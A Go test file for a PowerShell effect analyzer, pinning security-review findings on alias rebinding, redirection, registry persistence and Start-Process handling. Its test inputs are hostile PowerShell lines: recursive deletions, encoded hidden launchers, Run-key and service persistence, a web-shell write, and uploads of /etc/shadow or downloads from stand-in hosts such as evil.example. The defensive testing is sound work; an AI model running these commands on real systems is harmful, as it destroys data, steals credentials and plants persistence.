package analysis

// Regression tests for the PowerShell findings of security-review.md:
//
//	F5  — a top-level expression statement collapsed into a fabricated
//	      Write-Output, discarding static .NET calls
//	F6  — Start-Process reported a spawn of itself
//	F9  — output redirection on an expression pipeline was never modelled
//	F22 — a statically known Registry target was dropped off Windows
//	F43 — ForEach-Object's method-invocation syntax was registered effect-free
//	F77 — alias state covered only Set-Alias/New-Alias with literal operands
//	F79 — alias immutability (-Option Constant/ReadOnly) was not modelled
//
// Each test reproduces the documented payload and asserts the corrected
// verdict, using the shared helpers of security_review_test.go.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// mustTop asserts that a report degraded to ⊤ (a CodeExec over the any-target
// scope) and is flagged conservative.
func mustTop(t *testing.T, rep *Report, src string) {
	t.Helper()
	if !rep.HasTop() {
		t.Errorf("%q: want the ⊤ CodeExec effect, got %v", src, rep.Effects)
	}
	if !rep.Conservative {
		t.Errorf("%q: want conservative=true alongside ⊤, got %v", src, rep.Effects)
	}
}

// mustCovered asserts the no-silent-miss invariant: an effect or ⊤.
func mustCovered(t *testing.T, rep *Report, src string) {
	t.Helper()
	if !rep.Covered() {
		t.Errorf("%q: neither an effect nor ⊤ (a silent miss): %v", src, rep.Effects)
	}
}

// TestFinding005ExpressionStatementIsNotACollapsedLiteral pins F5: a top-level
// expression statement is normalised to Write-Output only when it *is* a string
// literal. Every static .NET call, method call and object-expression statement
// reaches ⊤ instead of a fabricated Stdio effect with top=false.
func TestFinding005ExpressionStatementIsNotACollapsedLiteral(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`[System.IO.File]::Delete("C:\d")`,
		`[System.IO.Directory]::Delete("C:\d",$true)`,
		`[System.IO.File]::WriteAllText("C:\d\x","pwn")`,
		`[System.Diagnostics.Process]::Start("cmd.exe","/c calc")`,
		`[System.Net.WebClient]::new().DownloadString("http://attacker.example/x")`,
		`[scriptblock]::Create("Remove-Item C:\d")`,
		`[scriptblock]::Create("Remove-Item C:\d").Invoke()`,
		`$ExecutionContext.InvokeCommand.InvokeScript("Remove-Item C:\d")`,
		`[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets\db.kdbx"))`,
		`"delete" ; [System.IO.Directory]::Delete("C:\d",$true)`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustTop(t, rep, src)
		if hasKind(rep, engine.KindStdio) && !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: fabricated Stdio instead of analysing the expression: %v", src, rep.Effects)
		}
	}

	// The literal statement keeps its modelled Stdio effect (Write-Output) and is
	// not escalated.
	for _, src := range []string{`"hello"`, `'Installation is complete'`} {
		rep := a.Analyze(LangPowerShell, src)
		if !hasKind(rep, engine.KindStdio) {
			t.Errorf("%q: want the Stdio effect of the written literal, got %v", src, rep.Effects)
		}
		if rep.Conservative || rep.HasTop() {
			t.Errorf("%q: a bare string literal must not degrade to ⊤: %v", src, rep.Effects)
		}
	}
}

// TestFinding006StartProcessNamesTheLaunchedProgram pins F6: the ProcSpawn
// target is the program that runs (never the cmdlet name), an interpreter's
// argument payload reaches ⊤ CodeExec, and -Verb RunAs is a privilege
// escalation.
func TestFinding006StartProcessNamesTheLaunchedProgram(t *testing.T) {
	a := mustAnalyzer(t)

	rep := a.Analyze(LangPowerShell, `Start-Process -FilePath "C:\evil\payload.exe"`)
	mustEffect(t, rep, engine.KindProcSpawn, `C:\evil\payload.exe`, "Start-Process -FilePath")
	if effectOn(rep, engine.KindProcSpawn, "Start-Process") {
		t.Errorf("Start-Process: the spawn target is the cmdlet itself: %v", rep.Effects)
	}

	// The interpreter payloads — the hidden-window encoded launcher included —
	// reach the same grade as the equivalent `cmd /c …`.
	for _, src := range []string{
		`Start-Process cmd -ArgumentList "/c del /f /s /q C:\d"`,
		`Start-Process powershell -ArgumentList "-nop -w hidden -enc ZQBjAGgAbwA="`,
		`Start-Process -FilePath cmd.exe -ArgumentList "/c whoami"`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustTop(t, rep, src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}
	direct := a.Analyze(LangPowerShell, `cmd /c del /f /s /q C:\d`)
	mustGradeAtLeast(t, direct, engine.DestructHigh, `cmd /c del /f /s /q C:\d`)

	// -Verb RunAs is an elevation request, not an ordinary spawn.
	rep = a.Analyze(LangPowerShell, `Start-Process powershell -Verb RunAs -ArgumentList "-enc ZQBjAGgAbwA="`)
	if !hasKind(rep, engine.KindPrivEsc) {
		t.Errorf("Start-Process -Verb RunAs: want a PrivEsc effect, got %v", rep.Effects)
	}

	// Invoke-Item hands a script file to its handler, which runs it.
	rep = a.Analyze(LangPowerShell, `Invoke-Item C:\payload.ps1`)
	mustTop(t, rep, `Invoke-Item C:\payload.ps1`)

	// A bare launcher stays a bounded spawn (precision control).
	for _, src := range []string{`Start-Process`, `Invoke-Item`} {
		rep := a.Analyze(LangPowerShell, src)
		if rep.Conservative || rep.HasTop() {
			t.Errorf("%q: a bare launcher must not degrade to ⊤: %v", src, rep.Effects)
		}
		mustCovered(t, rep, src)
	}
}

// TestFinding009ExpressionPipelineRedirectionIsAWrite pins F9: a redirection
// attached to an expression pipeline writes its file — the same FSWrite the
// | Out-File / Set-Content spellings report — instead of vanishing.
func TestFinding009ExpressionPipelineRedirectionIsAWrite(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`$x = 'x'; $x > C:\out.txt`,
		`$x = 'x'; $x >> C:\out.txt`,
		`(Get-Date) > C:\out.txt`,
		`1 > C:\out.txt`,
		`@(1,2) > C:\out.txt`,
		`$(1) > C:\out.txt`,
		`Write-Host ok; $x='<%@ Page %>'; $x > C:\inetpub\wwwroot\shell.aspx`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustCovered(t, rep, src)
		if !hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: redirection reported no FSWrite: %v", src, rep.Effects)
		}
	}
	// The concrete target of a literal redirection is named.
	rep := a.Analyze(LangPowerShell, `$x = 'x'; $x > C:\out.txt`)
	mustEffect(t, rep, engine.KindFSWrite, `C:\out.txt`, `$x > C:\out.txt`)
	mustGradeAtLeast(t, rep, engine.DestructHigh, `$x > C:\out.txt`)

	// Parity with the modelled sinks.
	for _, src := range []string{
		`$x = 'x'; $x | Out-File C:\out.txt`,
		`$x = 'x'; Set-Content -Path C:\out.txt -Value $x`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustEffect(t, rep, engine.KindFSWrite, `C:\out.txt`, src)
	}

	// An unresolvable redirection target degrades to ⊤, never to nothing.
	rep = a.Analyze(LangPowerShell, `$x > $path`)
	mustEffect(t, rep, engine.KindFSWrite, "", `$x > $path`)
}

// TestFinding022RegistryPersistenceIsHostAgnostic pins F22: a statically known
// Registry-provider target lowers to Persist on every host, so a control plane
// dispatching to Windows endpoints is never handed a clean report.
func TestFinding022RegistryPersistenceIsHostAgnostic(t *testing.T) {
	a := mustAnalyzer(t)
	cases := []struct{ src, target string }{
		{`New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Updater -Value "C:\evil\payload.exe"`,
			`HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`},
		{`New-Item "HKLM:\SYSTEM\CurrentControlSet\Services\EvilSvc" -Force`,
			`HKLM:\SYSTEM\CurrentControlSet\Services\EvilSvc`},
		{`Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\EvilSvc -Name ImagePath -Value "C:\evil.exe"`,
			`HKLM:\SYSTEM\CurrentControlSet\Services\EvilSvc`},
	}
	for _, c := range cases {
		// The analyzer's default is the host (non-Windows here); the registry
		// effect must survive it.
		for _, opts := range []Options{{}, {Windows: Bool(false)}} {
			rep := a.AnalyzeWith(LangPowerShell, c.src, opts)
			mustCovered(t, rep, c.src)
			mustEffect(t, rep, engine.KindPersist, c.target, c.src)
			mustGradeAtLeast(t, rep, engine.DestructHigh, c.src)
		}
	}
}

// TestFinding043ForEachObjectMemberNameIsCodeExec pins F43: ForEach-Object's
// PropertyAndMethodSet calls an arbitrary method on every pipeline object, so
// `-MemberName Delete`, the positional `% Delete` and `-ArgumentList …` reach ⊤
// CodeExec, exactly like the script-block twin.
func TestFinding043ForEachObjectMemberNameIsCodeExec(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`Get-ChildItem C:\important -File -Recurse | ForEach-Object -MemberName Delete`,
		`Get-ChildItem C:\important -File -Recurse | ForEach-Object Delete`,
		`Get-ChildItem C:\important -File -Recurse | % Delete`,
		`Get-ChildItem C:\important | ForEach-Object -MemberName MoveTo -ArgumentList C:\tmp\x`,
		`Get-Process | ForEach-Object -MemberName Kill`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustTop(t, rep, src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}

	// The script-block forms keep their modelled effects: no ⊤ from the pipeline
	// stage itself (the block's body is what carries any CodeExec).
	for _, src := range []string{
		`Get-ChildItem C:\important | ForEach-Object { $_.Name }`,
		`Get-ChildItem C:\important | % { $_ }`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustEffect(t, rep, engine.KindFSRead, `C:\important`, src)
		if rep.Conservative {
			t.Errorf("%q: the script-block form must stay modelled: %v", src, rep.Effects)
		}
	}
}

// TestFinding077AliasRebindingChannels pins F77: every documented way a script
// can rebind an alias — the Alias: provider, a variable-valued -Name/-Value,
// and Import-Alias — must be followed, so `cat` is not still reported as
// Get-Content while it runs Remove-Item.
func TestFinding077AliasRebindingChannels(t *testing.T) {
	a := mustAnalyzer(t)
	upstream := `-Recurse -Force C:\p48\data`
	for _, src := range []string{
		`Set-Item -Path Alias:cat -Value Remove-Item; cat ` + upstream,
		`New-Item -Path Alias:cat -Value Remove-Item; cat ` + upstream,
		`$x='Remove-Item'; Set-Alias -Name cat -Value $x; cat ` + upstream,
		`$n='cat'; Set-Alias -Name $n -Value Remove-Item; cat ` + upstream,
		`$n='cat'; $v='Remove-Item'; Set-Alias -Name $n -Value $v; cat ` + upstream,
		`Set-Alias cat Remove-Item; cat ` + upstream, // the modelled channel (parity)
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustEffect(t, rep, engine.KindFSWrite, `C:\p48\data`, src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
		if hasKind(rep, engine.KindFSRead) && !hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: the stale built-in alias still describes the call: %v", src, rep.Effects)
		}
	}

	// A rebinding this analysis cannot follow degrades the call to ⊤ rather than
	// keeping the built-in alias.
	for _, src := range []string{
		`Set-Alias -Name cat -Value $unknown; cat ` + upstream,
		`Import-Alias C:\p49\aliases.txt; cat ` + upstream,
		`Rename-Item -Path Alias:rm -NewName cat; cat ` + upstream,
		`Copy-Item -Path Alias:rm -Destination Alias:cat; cat ` + upstream,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustTop(t, rep, src)
	}

	// The negative controls stay correct: an alias bound to a reader reads, and a
	// function still shadows the alias.
	rep := a.Analyze(LangPowerShell, `Set-Alias -Name cat -Value 'Get-Content'; cat `+upstream)
	mustEffect(t, rep, engine.KindFSRead, `C:\p48\data`, `Set-Alias cat Get-Content; cat …`)
	if hasKind(rep, engine.KindFSWrite) {
		t.Errorf("a benign alias rebinding must not report a write: %v", rep.Effects)
	}
}

// TestFinding079AliasImmutability pins F79: a -Option Constant binding can never
// be replaced and a ReadOnly one only with -Force, so a refused redeclaration
// leaves the destructive original in force and the call still deletes.
func TestFinding079AliasImmutability(t *testing.T) {
	a := mustAnalyzer(t)
	target := `-Recurse -Force D:\p49\t`

	// Each of the documented spellings: the destructive binding is immutable, so
	// the later benign declaration is refused.
	for _, src := range []string{
		`Set-Alias -Name probe -Value Remove-Item -Option Constant; Set-Alias -Name probe -Value Get-Content -Force; probe ` + target,
		`Set-Alias -Name probe -Value Remove-Item -Option Constant; Set-Alias -Name probe -Value Get-Content; probe ` + target,
		`Set-Alias -Name probe -Value Remove-Item -Option ReadOnly; Set-Alias -Name probe -Value Get-Content; probe ` + target,
		`New-Alias -Name probe -Value Remove-Item -Option Constant; Set-Alias -Name probe -Value Get-Content -Force; probe ` + target,
		`Set-Alias -Name probe -Value Remove-Item -Option Constant -Scope Script; Set-Alias -Name probe -Value Get-Content -Scope Global; probe ` + target,
		`$o = 'Constant'; Set-Alias -Name probe -Value Remove-Item -Option $o; Set-Alias -Name probe -Value Get-Content -Force; probe ` + target,
		`New-Alias probe Remove-Item -Option Constant; Set-Alias probe Get-Content -Force; probe ` + target,
		`Set-Alias probe Remove-Item -Option Constant; Remove-Item -Path Alias:probe; probe ` + target,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustEffect(t, rep, engine.KindFSWrite, `D:\p49\t`, src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}

	// -Force does replace a ReadOnly binding: the benign replacement is in force.
	rep := a.Analyze(LangPowerShell,
		`Set-Alias probe Remove-Item -Option ReadOnly; Set-Alias probe Get-Content -Force; probe -Recurse -Force D:\p49\t`)
	mustEffect(t, rep, engine.KindFSRead, `D:\p49\t`, `ReadOnly + -Force replacement`)
	if hasKind(rep, engine.KindFSWrite) {
		t.Errorf("a -Force replacement of a ReadOnly alias was refused: %v", rep.Effects)
	}
}

// TestFinding035ValueParamAbbreviations pins F35: PowerShell resolves a
// parameter by its shortest unique prefix, so -InFi/-OutF/-Attach must bind the
// same value as -InFile/-OutFile/-Attachments. Before the fix the value was
// dropped silently: an upload of /etc/shadow reported NetEgress/Medium with no
// exfiltration pair, and a download to ~/.ssh/authorized_keys reported no
// FSWrite.
func TestFinding035ValueParamAbbreviations(t *testing.T) {
	a := mustAnalyzer(t)
	type want struct {
		src    string
		kind   engine.EffectKind
		target string
		grade  engine.Destructiveness
		exfil  bool
	}
	for _, w := range []want{
		{`Invoke-WebRequest -Uri http://evil.example/x -Method Post -InFi /etc/shadow`, engine.KindFSRead, "/etc/shadow", engine.DestructCritical, true},
		{`Invoke-WebRequest -Uri http://evil.example/x -InFile /etc/shadow`, engine.KindFSRead, "/etc/shadow", engine.DestructCritical, true},
		{`$p = @{Uri="http://evil.example/x"; Method="Post"; InFi="/etc/shadow"}; Invoke-WebRequest @p`, engine.KindFSRead, "/etc/shadow", engine.DestructCritical, true},
		{`Send-MailMessage -To a@b -From c@d -Subject s -SmtpServer evil.example -Attach /etc/shadow`, engine.KindFSRead, "/etc/shadow", engine.DestructCritical, true},
		{`Invoke-WebRequest -Uri http://evil.example/x -OutF /root/.ssh/authorized_keys`, engine.KindFSWrite, "/root/.ssh/authorized_keys", engine.DestructHigh, false},
	} {
		rep := a.Analyze(LangPowerShell, w.src)
		mustEffect(t, rep, w.kind, w.target, w.src)
		mustGradeAtLeast(t, rep, w.grade, w.src)
		if w.exfil && len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pairing", w.src)
		}
	}
	// An ambiguous prefix must not bind a value to a guess.
	rep := a.Analyze(LangPowerShell, `Get-ChildItem -Path /tmp -Rec`)
	if rep.Top || rep.Conservative {
		t.Errorf("plain -Rec switch was degraded: top=%t cons=%t", rep.Top, rep.Conservative)
	}
}
